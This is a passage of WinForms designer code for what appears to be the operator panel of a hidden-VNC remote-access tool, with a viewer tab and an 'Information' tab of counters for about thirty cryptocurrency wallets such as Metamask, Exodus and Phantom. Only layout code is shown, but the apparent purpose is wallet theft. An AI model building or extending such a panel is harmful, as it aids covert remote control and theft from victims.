            bloom188.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom189.Name = "Text";
            bloom189.Value = System.Drawing.Color.White;
            bloom190.Name = "Glow";
            bloom190.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom191.Name = "Border";
            bloom191.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom192.Name = "Corners";
            bloom192.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton4.Colors = new BirdBrainmofo.Bloom[] {
        bloom180,
        bloom181,
        bloom182,
        bloom183,
        bloom184,
        bloom185,
        bloom186,
        bloom187,
        bloom188,
        bloom189,
        bloom190,
        bloom191,
        bloom192};
            this.studioButton4.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton4.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton4.Image = null;
            this.studioButton4.Location = new System.Drawing.Point(1162, -5);
            this.studioButton4.Name = "studioButton4";
            this.studioButton4.NoRounding = false;
            this.studioButton4.Size = new System.Drawing.Size(13, 30);
            this.studioButton4.TabIndex = 38;
            this.studioButton4.Transparent = true;
            this.studioButton4.Click += new System.EventHandler(this.studioButton4_Click);
            // 
            // studioButton3
            // 
            this.studioButton3.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton3.BackColor = System.Drawing.Color.Transparent;
            bloom193.Name = "DownGradient1";
            bloom193.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom194.Name = "DownGradient2";
            bloom194.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom195.Name = "NoneGradient1";
            bloom195.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom196.Name = "NoneGradient2";
            bloom196.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom197.Name = "Shine1";
            bloom197.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom198.Name = "Shine2A";
            bloom198.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom199.Name = "Shine2B";
            bloom199.Value = System.Drawing.Color.Transparent;
            bloom200.Name = "Shine3";
            bloom200.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom201.Name = "TextShade";
            bloom201.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom202.Name = "Text";
            bloom202.Value = System.Drawing.Color.White;
            bloom203.Name = "Glow";
            bloom203.Value = System.Drawing.Color.FromArgb(((int)(((byte)(10)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom204.Name = "Border";
            bloom204.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            bloom205.Name = "Corners";
            bloom205.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(40)))), ((int)(((byte)(70)))));
            this.studioButton3.Colors = new BirdBrainmofo.Bloom[] {
        bloom193,
        bloom194,
        bloom195,
        bloom196,
        bloom197,
        bloom198,
        bloom199,
        bloom200,
        bloom201,
        bloom202,
        bloom203,
        bloom204,
        bloom205};
            this.studioButton3.Customization = "X0Et/3NVQf9zVUH/X0Et/////x7///8e////AP///xQAAAAy/////////wpGKBT/RigU/w==";
            this.studioButton3.Font = new System.Drawing.Font("Verdana", 8F);
            this.studioButton3.Image = null;
            this.studioButton3.Location = new System.Drawing.Point(1143, -5);
            this.studioButton3.Name = "studioButton3";
            this.studioButton3.NoRounding = false;
            this.studioButton3.Size = new System.Drawing.Size(13, 30);
            this.studioButton3.TabIndex = 37;
            this.studioButton3.Transparent = true;
            this.studioButton3.Click += new System.EventHandler(this.studioButton3_Click);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 8.25F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.Location = new System.Drawing.Point(40, 15);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(41, 13);
            this.label3.TabIndex = 41;
            this.label3.Text = "HVNC";
            // 
            // ambianceTabControl1
            // 
            this.ambianceTabControl1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.ambianceTabControl1.Controls.Add(this.tabPage1);
            this.ambianceTabControl1.Controls.Add(this.tabPage2);
            this.ambianceTabControl1.Controls.Add(this.tabPage3);
            this.ambianceTabControl1.Controls.Add(this.tabPage4);
            this.ambianceTabControl1.Controls.Add(this.tabPage5);
            this.ambianceTabControl1.ItemSize = new System.Drawing.Size(80, 24);
            this.ambianceTabControl1.Location = new System.Drawing.Point(15, 37);
            this.ambianceTabControl1.Name = "ambianceTabControl1";
            this.ambianceTabControl1.SelectedIndex = 0;
            this.ambianceTabControl1.Size = new System.Drawing.Size(1071, 656);
            this.ambianceTabControl1.TabIndex = 108;
            // 
            // tabPage1
            // 
            this.tabPage1.BackColor = System.Drawing.Color.White;
            this.tabPage1.Controls.Add(this.VNCBox);
            this.tabPage1.Location = new System.Drawing.Point(4, 28);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage1.Size = new System.Drawing.Size(1063, 624);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "hVNC Viewer";
            // 
            // VNCBox
            // 
            this.VNCBox.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("VNCBox.BackgroundImage")));
            this.VNCBox.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch;
            this.VNCBox.Dock = System.Windows.Forms.DockStyle.Fill;
            this.VNCBox.Location = new System.Drawing.Point(3, 3);
            this.VNCBox.Name = "VNCBox";
            this.VNCBox.Size = new System.Drawing.Size(1057, 618);
            this.VNCBox.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.VNCBox.TabIndex = 7;
            this.VNCBox.TabStop = false;
            this.VNCBox.MouseDown += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseDown);
            this.VNCBox.MouseEnter += new System.EventHandler(this.VNCBox_MouseEnter_1);
            this.VNCBox.MouseHover += new System.EventHandler(this.VNCBox_MouseHover);
            this.VNCBox.MouseMove += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseMove);
            this.VNCBox.MouseUp += new System.Windows.Forms.MouseEventHandler(this.VNCBox_MouseUp);
            // 
            // tabPage2
            // 
            this.tabPage2.BackColor = System.Drawing.Color.White;
            this.tabPage2.Controls.Add(this.txtBitapp);
            this.tabPage2.Controls.Add(this.txtCoin98);
            this.tabPage2.Controls.Add(this.txtEqual);
            this.tabPage2.Controls.Add(this.txtMetamask);
            this.tabPage2.Controls.Add(this.txtJaxx);
            this.tabPage2.Controls.Add(this.txtKeplr);
            this.tabPage2.Controls.Add(this.txtCrocobit);
            this.tabPage2.Controls.Add(this.txtOxygen);
            this.tabPage2.Controls.Add(this.txtGuarda);
            this.tabPage2.Controls.Add(this.txtBytecoin);
            this.tabPage2.Controls.Add(this.txtMobox);
            this.tabPage2.Controls.Add(this.txtGuild);
            this.tabPage2.Controls.Add(this.txtIconex);
            this.tabPage2.Controls.Add(this.txtTon);
            this.tabPage2.Controls.Add(this.txtCoinomi);
            this.tabPage2.Controls.Add(this.txtSollet);
            this.tabPage2.Controls.Add(this.txtSlope);
            this.tabPage2.Controls.Add(this.txtStarcoin);
            this.tabPage2.Controls.Add(this.txtPhantom);
            this.tabPage2.Controls.Add(this.txtArmory);
            this.tabPage2.Controls.Add(this.txtFinnie);
            this.tabPage2.Controls.Add(this.txtBinance);
            this.tabPage2.Controls.Add(this.txtXinPay);
            this.tabPage2.Controls.Add(this.txtMath);
            this.tabPage2.Controls.Add(this.txtExodus);
            this.tabPage2.Controls.Add(this.txtLiquality);
            this.tabPage2.Controls.Add(this.txtTron);
            this.tabPage2.Controls.Add(this.txtSwash);
            this.tabPage2.Controls.Add(this.txtNifty);
            this.tabPage2.Controls.Add(this.txtzcash);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox31);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox30);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox29);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox28);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox27);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox26);
            this.tabPage2.Controls.Add(this.label35);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox25);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox24);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox23);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox22);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox21);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox20);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox19);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox18);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox17);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox16);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox15);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox14);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox13);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox12);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox9);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox10);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox11);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox6);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox7);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox5);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox4);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox3);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox2);
            this.tabPage2.Controls.Add(this.rjCircularPictureBox1);
            this.tabPage2.Controls.Add(this.label37);
            this.tabPage2.Controls.Add(this.label36);
            this.tabPage2.Controls.Add(this.label30);
            this.tabPage2.Controls.Add(this.label29);
            this.tabPage2.Controls.Add(this.label32);
            this.tabPage2.Controls.Add(this.label33);
            this.tabPage2.Controls.Add(this.label34);
            this.tabPage2.Controls.Add(this.label23);
            this.tabPage2.Controls.Add(this.label24);
            this.tabPage2.Controls.Add(this.label26);
            this.tabPage2.Controls.Add(this.label27);
            this.tabPage2.Controls.Add(this.label28);
            this.tabPage2.Controls.Add(this.label22);
            this.tabPage2.Controls.Add(this.label19);
            this.tabPage2.Controls.Add(this.label20);
            this.tabPage2.Controls.Add(this.label21);
            this.tabPage2.Controls.Add(this.label16);
            this.tabPage2.Controls.Add(this.label17);
            this.tabPage2.Controls.Add(this.label13);
            this.tabPage2.Controls.Add(this.label14);
            this.tabPage2.Controls.Add(this.label15);
            this.tabPage2.Controls.Add(this.label10);
            this.tabPage2.Controls.Add(this.label11);
            this.tabPage2.Controls.Add(this.label12);
            this.tabPage2.Controls.Add(this.label9);
            this.tabPage2.Controls.Add(this.label5);
            this.tabPage2.Controls.Add(this.label6);
            this.tabPage2.Controls.Add(this.label8);
            this.tabPage2.Controls.Add(this.label7);
            this.tabPage2.Location = new System.Drawing.Point(4, 28);
            this.tabPage2.Name = "tabPage2";
            this.tabPage2.Padding = new System.Windows.Forms.Padding(3);
            this.tabPage2.Size = new System.Drawing.Size(1063, 624);
            this.tabPage2.TabIndex = 1;
            this.tabPage2.Text = "Information";
            // 
            // txtBitapp
            // 
            this.txtBitapp.AutoSize = true;
            this.txtBitapp.BackColor = System.Drawing.Color.White;
            this.txtBitapp.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtBitapp.Location = new System.Drawing.Point(328, 182);
            this.txtBitapp.Name = "txtBitapp";
            this.txtBitapp.Size = new System.Drawing.Size(14, 13);
            this.txtBitapp.TabIndex = 275;
            this.txtBitapp.Text = "0";
            // 
            // txtCoin98
            // 
            this.txtCoin98.AutoSize = true;
            this.txtCoin98.BackColor = System.Drawing.Color.White;
            this.txtCoin98.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtCoin98.Location = new System.Drawing.Point(328, 245);
            this.txtCoin98.Name = "txtCoin98";
            this.txtCoin98.Size = new System.Drawing.Size(14, 13);
            this.txtCoin98.TabIndex = 274;
            this.txtCoin98.Text = "0";
            // 
            // txtEqual
            // 
            this.txtEqual.AutoSize = true;
            this.txtEqual.BackColor = System.Drawing.Color.White;
            this.txtEqual.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtEqual.Location = new System.Drawing.Point(328, 309);
            this.txtEqual.Name = "txtEqual";
            this.txtEqual.Size = new System.Drawing.Size(14, 13);
            this.txtEqual.TabIndex = 273;
            this.txtEqual.Text = "0";
            // 
            // txtMetamask
            // 
            this.txtMetamask.AutoSize = true;
            this.txtMetamask.BackColor = System.Drawing.Color.White;
            this.txtMetamask.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtMetamask.Location = new System.Drawing.Point(328, 371);
            this.txtMetamask.Name = "txtMetamask";
            this.txtMetamask.Size = new System.Drawing.Size(14, 13);
            this.txtMetamask.TabIndex = 272;
            this.txtMetamask.Text = "0";
            // 
            // txtJaxx
            // 
            this.txtJaxx.AutoSize = true;
            this.txtJaxx.BackColor = System.Drawing.Color.White;
            this.txtJaxx.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtJaxx.Location = new System.Drawing.Point(328, 121);
            this.txtJaxx.Name = "txtJaxx";
            this.txtJaxx.Size = new System.Drawing.Size(14, 13);
            this.txtJaxx.TabIndex = 271;
            this.txtJaxx.Text = "0";
            // 
            // txtKeplr
            // 
            this.txtKeplr.AutoSize = true;
            this.txtKeplr.BackColor = System.Drawing.Color.White;
            this.txtKeplr.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtKeplr.Location = new System.Drawing.Point(1007, 182);
            this.txtKeplr.Name = "txtKeplr";
            this.txtKeplr.Size = new System.Drawing.Size(14, 13);
            this.txtKeplr.TabIndex = 270;
            this.txtKeplr.Text = "0";
            // 
            // txtCrocobit
            // 
            this.txtCrocobit.AutoSize = true;
            this.txtCrocobit.BackColor = System.Drawing.Color.White;
            this.txtCrocobit.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtCrocobit.Location = new System.Drawing.Point(1007, 245);
            this.txtCrocobit.Name = "txtCrocobit";
            this.txtCrocobit.Size = new System.Drawing.Size(14, 13);
            this.txtCrocobit.TabIndex = 269;
            this.txtCrocobit.Text = "0";
            // 
            // txtOxygen
            // 
            this.txtOxygen.AutoSize = true;
            this.txtOxygen.BackColor = System.Drawing.Color.White;
            this.txtOxygen.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtOxygen.Location = new System.Drawing.Point(1007, 309);
            this.txtOxygen.Name = "txtOxygen";
            this.txtOxygen.Size = new System.Drawing.Size(14, 13);
            this.txtOxygen.TabIndex = 268;
            this.txtOxygen.Text = "0";
            // 
            // txtGuarda
            // 
            this.txtGuarda.AutoSize = true;
            this.txtGuarda.BackColor = System.Drawing.Color.White;
            this.txtGuarda.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtGuarda.Location = new System.Drawing.Point(1007, 371);
            this.txtGuarda.Name = "txtGuarda";
            this.txtGuarda.Size = new System.Drawing.Size(14, 13);
            this.txtGuarda.TabIndex = 267;
            this.txtGuarda.Text = "0";
            // 
            // txtBytecoin
            // 
            this.txtBytecoin.AutoSize = true;
            this.txtBytecoin.BackColor = System.Drawing.Color.White;
            this.txtBytecoin.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtBytecoin.Location = new System.Drawing.Point(1007, 121);
            this.txtBytecoin.Name = "txtBytecoin";
            this.txtBytecoin.Size = new System.Drawing.Size(14, 13);
            this.txtBytecoin.TabIndex = 266;
            this.txtBytecoin.Text = "0";
            // 
            // txtMobox
            // 
            this.txtMobox.AutoSize = true;
            this.txtMobox.BackColor = System.Drawing.Color.White;
            this.txtMobox.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtMobox.Location = new System.Drawing.Point(852, 182);
            this.txtMobox.Name = "txtMobox";
            this.txtMobox.Size = new System.Drawing.Size(14, 13);
            this.txtMobox.TabIndex = 265;
            this.txtMobox.Text = "0";
            // 
            // txtGuild
            // 
            this.txtGuild.AutoSize = true;
            this.txtGuild.BackColor = System.Drawing.Color.White;
            this.txtGuild.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtGuild.Location = new System.Drawing.Point(852, 245);
            this.txtGuild.Name = "txtGuild";
            this.txtGuild.Size = new System.Drawing.Size(14, 13);
            this.txtGuild.TabIndex = 264;
            this.txtGuild.Text = "0";
            // 
            // txtIconex
            // 
            this.txtIconex.AutoSize = true;
            this.txtIconex.BackColor = System.Drawing.Color.White;
            this.txtIconex.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtIconex.Location = new System.Drawing.Point(852, 309);
            this.txtIconex.Name = "txtIconex";
            this.txtIconex.Size = new System.Drawing.Size(14, 13);
            this.txtIconex.TabIndex = 263;
            this.txtIconex.Text = "0";
            // 
            // txtTon
            // 
            this.txtTon.AutoSize = true;
            this.txtTon.BackColor = System.Drawing.Color.White;
            this.txtTon.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtTon.Location = new System.Drawing.Point(852, 371);
            this.txtTon.Name = "txtTon";
            this.txtTon.Size = new System.Drawing.Size(14, 13);
            this.txtTon.TabIndex = 262;
            this.txtTon.Text = "0";
            // 
            // txtCoinomi
            // 
            this.txtCoinomi.AutoSize = true;
            this.txtCoinomi.BackColor = System.Drawing.Color.White;
            this.txtCoinomi.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtCoinomi.Location = new System.Drawing.Point(852, 121);
            this.txtCoinomi.Name = "txtCoinomi";
            this.txtCoinomi.Size = new System.Drawing.Size(14, 13);
            this.txtCoinomi.TabIndex = 261;
            this.txtCoinomi.Text = "0";
            // 
            // txtSollet
            // 
            this.txtSollet.AutoSize = true;
            this.txtSollet.BackColor = System.Drawing.Color.White;
            this.txtSollet.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtSollet.Location = new System.Drawing.Point(680, 182);
            this.txtSollet.Name = "txtSollet";
            this.txtSollet.Size = new System.Drawing.Size(14, 13);
            this.txtSollet.TabIndex = 260;
            this.txtSollet.Text = "0";
            // 
            // txtSlope
            // 
            this.txtSlope.AutoSize = true;
            this.txtSlope.BackColor = System.Drawing.Color.White;
            this.txtSlope.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtSlope.Location = new System.Drawing.Point(680, 245);
            this.txtSlope.Name = "txtSlope";
            this.txtSlope.Size = new System.Drawing.Size(14, 13);
            this.txtSlope.TabIndex = 259;
            this.txtSlope.Text = "0";
            // 
            // txtStarcoin
            // 
            this.txtStarcoin.AutoSize = true;
            this.txtStarcoin.BackColor = System.Drawing.Color.White;
            this.txtStarcoin.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtStarcoin.Location = new System.Drawing.Point(680, 309);
            this.txtStarcoin.Name = "txtStarcoin";
            this.txtStarcoin.Size = new System.Drawing.Size(14, 13);
            this.txtStarcoin.TabIndex = 258;
            this.txtStarcoin.Text = "0";
            // 
            // txtPhantom
            // 
            this.txtPhantom.AutoSize = true;
            this.txtPhantom.BackColor = System.Drawing.Color.White;
            this.txtPhantom.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtPhantom.Location = new System.Drawing.Point(680, 371);
            this.txtPhantom.Name = "txtPhantom";
            this.txtPhantom.Size = new System.Drawing.Size(14, 13);
            this.txtPhantom.TabIndex = 257;
            this.txtPhantom.Text = "0";
            // 
            // txtArmory
            // 
            this.txtArmory.AutoSize = true;
            this.txtArmory.BackColor = System.Drawing.Color.White;
            this.txtArmory.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtArmory.Location = new System.Drawing.Point(680, 121);
            this.txtArmory.Name = "txtArmory";
            this.txtArmory.Size = new System.Drawing.Size(14, 13);
            this.txtArmory.TabIndex = 256;
            this.txtArmory.Text = "0";
            // 
            // txtFinnie
            // 
            this.txtFinnie.AutoSize = true;
            this.txtFinnie.BackColor = System.Drawing.Color.White;
            this.txtFinnie.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtFinnie.Location = new System.Drawing.Point(506, 182);
            this.txtFinnie.Name = "txtFinnie";
            this.txtFinnie.Size = new System.Drawing.Size(14, 13);
            this.txtFinnie.TabIndex = 255;
            this.txtFinnie.Text = "0";
            // 
            // txtBinance
            // 
            this.txtBinance.AutoSize = true;
            this.txtBinance.BackColor = System.Drawing.Color.White;
            this.txtBinance.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtBinance.Location = new System.Drawing.Point(506, 245);
            this.txtBinance.Name = "txtBinance";
            this.txtBinance.Size = new System.Drawing.Size(14, 13);
            this.txtBinance.TabIndex = 254;
            this.txtBinance.Text = "0";
            // 
            // txtXinPay
            // 
            this.txtXinPay.AutoSize = true;
            this.txtXinPay.BackColor = System.Drawing.Color.White;
            this.txtXinPay.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtXinPay.Location = new System.Drawing.Point(506, 309);
            this.txtXinPay.Name = "txtXinPay";
            this.txtXinPay.Size = new System.Drawing.Size(14, 13);
            this.txtXinPay.TabIndex = 253;
            this.txtXinPay.Text = "0";
            // 
            // txtMath
            // 
            this.txtMath.AutoSize = true;
            this.txtMath.BackColor = System.Drawing.Color.White;
            this.txtMath.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtMath.Location = new System.Drawing.Point(506, 371);
            this.txtMath.Name = "txtMath";
            this.txtMath.Size = new System.Drawing.Size(14, 13);
            this.txtMath.TabIndex = 252;
            this.txtMath.Text = "0";
            // 
            // txtExodus
            // 
            this.txtExodus.AutoSize = true;
            this.txtExodus.BackColor = System.Drawing.Color.White;
            this.txtExodus.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtExodus.Location = new System.Drawing.Point(506, 121);
            this.txtExodus.Name = "txtExodus";
            this.txtExodus.Size = new System.Drawing.Size(14, 13);
            this.txtExodus.TabIndex = 251;
            this.txtExodus.Text = "0";
            // 
            // txtLiquality
            // 
            this.txtLiquality.AutoSize = true;
            this.txtLiquality.BackColor = System.Drawing.Color.White;
            this.txtLiquality.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtLiquality.Location = new System.Drawing.Point(150, 182);
            this.txtLiquality.Name = "txtLiquality";
            this.txtLiquality.Size = new System.Drawing.Size(14, 13);
            this.txtLiquality.TabIndex = 250;
            this.txtLiquality.Text = "0";
            // 
            // txtTron
            // 
            this.txtTron.AutoSize = true;
            this.txtTron.BackColor = System.Drawing.Color.White;
            this.txtTron.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtTron.Location = new System.Drawing.Point(150, 245);
            this.txtTron.Name = "txtTron";
            this.txtTron.Size = new System.Drawing.Size(14, 13);
            this.txtTron.TabIndex = 249;
            this.txtTron.Text = "0";
            // 
            // txtSwash
            // 
            this.txtSwash.AutoSize = true;
            this.txtSwash.BackColor = System.Drawing.Color.White;
            this.txtSwash.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtSwash.Location = new System.Drawing.Point(150, 309);
            this.txtSwash.Name = "txtSwash";
            this.txtSwash.Size = new System.Drawing.Size(14, 13);
            this.txtSwash.TabIndex = 248;
            this.txtSwash.Text = "0";
            // 
            // txtNifty
            // 
            this.txtNifty.AutoSize = true;
            this.txtNifty.BackColor = System.Drawing.Color.White;
            this.txtNifty.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtNifty.Location = new System.Drawing.Point(150, 371);
            this.txtNifty.Name = "txtNifty";
            this.txtNifty.Size = new System.Drawing.Size(14, 13);
            this.txtNifty.TabIndex = 247;
            this.txtNifty.Text = "0";
            // 
            // txtzcash
            // 
            this.txtzcash.AutoSize = true;
            this.txtzcash.BackColor = System.Drawing.Color.White;
            this.txtzcash.ForeColor = System.Drawing.Color.MediumSeaGreen;
            this.txtzcash.Location = new System.Drawing.Point(150, 121);
            this.txtzcash.Name = "txtzcash";
            this.txtzcash.Size = new System.Drawing.Size(14, 13);
            this.txtzcash.TabIndex = 244;
            this.txtzcash.Text = "0";
            // 
            // rjCircularPictureBox31
            // 
            this.rjCircularPictureBox31.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox31.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox31.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox31.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox31.BorderSize = 2;
            this.rjCircularPictureBox31.GradientAngle = 50F;
            this.rjCircularPictureBox31.Location = new System.Drawing.Point(731, 358);
            this.rjCircularPictureBox31.Name = "rjCircularPictureBox31";
            this.rjCircularPictureBox31.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox31.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox31.TabIndex = 243;
            this.rjCircularPictureBox31.TabStop = false;
            // 
            // rjCircularPictureBox30
            // 
            this.rjCircularPictureBox30.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox30.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox30.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox30.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox30.BorderSize = 2;
            this.rjCircularPictureBox30.GradientAngle = 50F;
            this.rjCircularPictureBox30.Location = new System.Drawing.Point(731, 232);
            this.rjCircularPictureBox30.Name = "rjCircularPictureBox30";
            this.rjCircularPictureBox30.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox30.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox30.TabIndex = 242;
            this.rjCircularPictureBox30.TabStop = false;
            // 
            // rjCircularPictureBox29
            // 
            this.rjCircularPictureBox29.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox29.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox29.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox29.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox29.BorderSize = 2;
            this.rjCircularPictureBox29.GradientAngle = 50F;
            this.rjCircularPictureBox29.Location = new System.Drawing.Point(731, 169);
            this.rjCircularPictureBox29.Name = "rjCircularPictureBox29";
            this.rjCircularPictureBox29.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox29.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox29.TabIndex = 241;
            this.rjCircularPictureBox29.TabStop = false;
            // 
            // rjCircularPictureBox28
            // 
            this.rjCircularPictureBox28.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox28.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
            this.rjCircularPictureBox28.BorderColor2 = System.Drawing.Color.White;
            this.rjCircularPictureBox28.BorderLineStyle = System.Drawing.Drawing2D.DashStyle.Solid;
            this.rjCircularPictureBox28.BorderSize = 2;
            this.rjCircularPictureBox28.GradientAngle = 50F;
            this.rjCircularPictureBox28.Location = new System.Drawing.Point(558, 296);
            this.rjCircularPictureBox28.Name = "rjCircularPictureBox28";
            this.rjCircularPictureBox28.Size = new System.Drawing.Size(39, 39);
            this.rjCircularPictureBox28.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.rjCircularPictureBox28.TabIndex = 240;
            this.rjCircularPictureBox28.TabStop = false;
            // 
            // rjCircularPictureBox27
            // 
            this.rjCircularPictureBox27.BackColor = System.Drawing.Color.Black;
            this.rjCircularPictureBox27.BorderCapStyle = System.Drawing.Drawing2D.DashCap.Flat;
            this.rjCircularPictureBox27.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(53)))), ((int)(((byte)(73)))), ((int)(((byte)(103)))));
